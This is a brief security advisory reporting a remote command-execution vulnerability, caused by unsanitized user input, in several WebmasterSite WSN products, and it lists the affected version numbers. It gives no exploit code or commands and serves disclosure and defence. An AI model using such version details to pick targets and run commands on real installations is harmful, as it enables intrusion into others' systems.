Multiple WebmasterSite products are prone to a remote shell command-execution vulnerability because the applications fail to sufficiently sanitize user-supplied data.

Successfully exploiting this issue will allow an attacker to execute arbitrary commands in the context of the affected application.

This issue affects the following products:

WSN Forum 4.1.43
WSN Knowledge Base 4.1.36
WSN Links 4.1.44
WSN Gallery 4.1.30

Note that previous versions may also be vulnerable.
